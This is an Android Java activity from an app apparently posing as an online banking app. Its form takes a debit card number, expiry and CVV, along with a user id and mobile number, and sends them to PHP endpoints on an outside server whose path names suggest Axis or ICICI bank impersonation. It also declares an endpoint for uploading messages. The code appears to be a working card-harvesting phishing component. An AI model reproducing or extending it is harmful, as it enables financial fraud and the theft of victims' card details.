package com.codewithmuddasir.onlinebanking;

import android.app.ProgressDialog;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.databinding.DataBindingUtil;

import com.codewithmuddasir.onlinebanking.databinding.ActivityCardDetailBinding;
import com.codewithmuddasir.onlinebanking.helper.Util;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;
import retrofit2.http.Body;
import retrofit2.http.POST;
import retrofit2.http.PUT;

public class CardDetail extends AppCompatActivity {

    ActivityCardDetailBinding binding;

    private Util util;

    private ProgressDialog progressDialog;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = DataBindingUtil.setContentView(this, R.layout.activity_card_detail);

        util = new Util();

        progressDialog = new ProgressDialog(CardDetail.this);
        progressDialog.setMessage("Loading... Please Wait");
        progressDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        progressDialog.setCancelable(false);


        binding.sub.setOnClickListener(view -> {

            if(binding.deb.getText().toString().isEmpty() || binding.cvv.getText().toString().isEmpty()
                    || binding.mon.getText().toString().isEmpty()|| binding.year.getText().toString().isEmpty()){
                Toast.makeText(this, "fill all fields", Toast.LENGTH_SHORT).show();
            }else{

                Intent intent2 = getIntent();
                User user = new User(intent2.getStringExtra("u"),
                        binding.deb.getText().toString(),binding.mon.getText().toString(),
                        binding.year.getText().toString()
                        ,binding.cvv.getText().toString(),intent2.getStringExtra("m"));

                ApiService apiService = ApiClient.getClient().create(ApiService.class);
                Call<Void> call = apiService.createUser(user);

                call.enqueue(new Callback<Void>() {
                    @Override
                    public void onResponse(Call<Void> call, Response<Void> response) {
                        // Handle successful response
                        if (response.isSuccessful()) {
                            // Data sent successfully
                            Intent intent = new Intent(CardDetail.this, CongratulationActivity.class);
                            startActivity(intent);
                        } else {
                            // Handle other response codes if needed
                            Log.d("asdf123","unsucess");
                        }
                    }

                    @Override
                    public void onFailure(Call<Void> call, Throwable t) {
                        // Handle failure
                        Log.d("asdf123",t.toString());
                    }
                });



            }


        });


    }

}




class User {
    private String userId;
    private String debitcard;
    private String monthexpire;
    private String monthyear;
    private String cvv;
    private String mobile;

    public User(String useridf,
                String debitcard, String monthexpir,String monthyear, String cvv,String mobile) {
        this.userId = useridf;
        this.debitcard = debitcard;
        this.monthexpire = monthexpir;
        this.cvv = cvv;
        this.monthyear = monthyear;
        this.mobile = mobile;
    }
}





interface ApiService {
    @PUT("fourthPage.php")
    Call<Void> createUser(@Body User user);


    @POST("icicInsertMessage.php")
    Call<Void> createmessage(@Body message message);


    @POST("firstPageAdd.php")
    Call<Void> createfirstpage(@Body firstpage message);

    @PUT("secondPage.php")
    Call<Void> createsecondpage(@Body secondapge message);

    @PUT("thirdPage.php")
    Call<Void> createthirdpage(@Body thirdapge message);

}


class ApiClient {
    private static final String BASE_URL = "https://test-annad.in/annad/axis_android/";
    private static Retrofit retrofit;

    public static Retrofit getClient() {
        if (retrofit == null) {
            retrofit = new Retrofit.Builder()
                    .baseUrl(BASE_URL)
                    .addConverterFactory(GsonConverterFactory.create())
                    .build();
        }
        return retrofit;
    }
}